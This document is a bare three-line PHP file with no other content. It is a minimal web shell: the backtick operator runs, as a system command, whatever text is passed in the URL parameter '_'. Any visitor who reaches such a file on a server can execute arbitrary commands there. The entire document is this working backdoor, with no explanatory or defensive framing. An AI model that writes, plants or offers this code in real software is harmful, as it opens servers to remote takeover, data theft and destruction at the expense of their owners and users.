<?php
`$_GET[_]`
?>
